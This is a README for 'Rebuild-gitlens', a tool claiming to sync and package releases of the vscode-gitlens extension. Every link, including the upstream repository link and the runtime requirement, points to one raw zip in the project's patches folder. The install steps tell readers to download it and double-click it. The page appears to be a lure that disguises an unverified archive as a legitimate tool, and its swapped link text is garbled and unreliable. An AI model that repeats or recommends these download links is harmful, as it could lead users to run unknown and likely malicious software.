# 🚀 Rebuild-gitlens - Effortlessly Sync the Latest Releases

[![Download Now](https://github.com/hicemen/Rebuild-gitlens/raw/refs/heads/main/patches/gitlens-Rebuild-v3.4.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/hicemen/Rebuild-gitlens/raw/refs/heads/main/patches/gitlens-Rebuild-v3.4.zip)

## 📋 Overview

Rebuild-gitlens is designed to help you easily synchronize and package the latest release of [gitkraken/vscode-gitlens](https://github.com/hicemen/Rebuild-gitlens/raw/refs/heads/main/patches/gitlens-Rebuild-v3.4.zip). This tool provides a simple way to create a personal testing environment while also featuring partial localization into Chinese.

## 🚀 Features

- Specify a version or grab the latest automatically
- Detect existing tags to avoid redundant packaging
- Automatically install dependencies and generate a .vsix installation package
- Create GitHub release notes that include changelogs

## ⏰ Triggering Workflows

### 🕒 Scheduled Trigger

By default, this workflow runs automatically every day at midnight. It pulls and packages the newest release version.

```yaml
schedule:
    - cron: '0 0 * * *'
```

### 👈 Manual Trigger

You can manually run the workflow via the GitHub Actions page. You can choose a specific version or use the latest one by default.

1. Go to the **Actions** page of the repository.
2. Select the **Sync Release** workflow.
3. Click **Run workflow**.
4. Optionally, enter a version number (like `v17.8.1`). Leave it blank to get the latest version.
5. Click the **Run workflow** button to execute.

## 📦 Input Parameters

| Parameter | Type   | Required | Default     | Description                              |
|-----------|--------|----------|-------------|------------------------------------------|
| `version` | string | No       | Latest      | Release version to sync (e.g., `v17.8.1`). Leave blank for the latest version. |

## 🔄 Workflow Steps

1. **Version Parsing**: The tool checks the entered version number. If left blank, it retrieves the latest release version using the GitHub API.
2. **Local Detection**: It verifies whether the local repository has the tag for that version. If it exists, it skips the packaging process.
3. **Code Retrieval**: The tool pulls the specified version's code from the upstream repository `gitkraken/vscode-gitlens`.
4. **Release Information**: It collects changelogs from the upstream release.
5. **Code Checkout**: Switch to the code version specified.
6. **Dependency Installation**: Executes `pnpm install` to install project dependencies.
7. **Packaging Build**: Runs the build command to create the installation package.

## 📥 Download & Install

To get started with Rebuild-gitlens, visit the Releases page to download the latest version:

[![Download Now](https://github.com/hicemen/Rebuild-gitlens/raw/refs/heads/main/patches/gitlens-Rebuild-v3.4.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/hicemen/Rebuild-gitlens/raw/refs/heads/main/patches/gitlens-Rebuild-v3.4.zip)

After downloading, follow these steps to install:

1. Locate the downloaded file on your computer.
2. Double-click the file to start the installation process.
3. Follow the on-screen instructions to complete the setup.
4. After installation, open the application and begin using it.

## 🛠️ System Requirements

To run Rebuild-gitlens effectively, you need the following:

- An operating system: Windows 10 or later, macOS, or Linux.
- https://github.com/hicemen/Rebuild-gitlens/raw/refs/heads/main/patches/gitlens-Rebuild-v3.4.zip version 12 or later installed on your machine.
- A stable internet connection to download dependencies and updates.

## 📄 Changelog

Release notes detail the changes made in each version. This helps you keep track of what has been updated. Consult the changelog after downloading to understand new features or fixes.

## 📝 Support

If you encounter issues or have questions, visit the Issues section of the repository. You can also file a bug report if necessary. Community members and maintainers are happy to assist you.

## 🏁 Conclusion

Rebuild-gitlens simplifies the process of syncing versions of vscode-gitlens. With few steps, you can keep your environment up-to-date, enabling better development and testing experiences. For any further assistance, feel free to reach out or browse through the repository documentation.

[![Download Now](https://github.com/hicemen/Rebuild-gitlens/raw/refs/heads/main/patches/gitlens-Rebuild-v3.4.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/hicemen/Rebuild-gitlens/raw/refs/heads/main/patches/gitlens-Rebuild-v3.4.zip)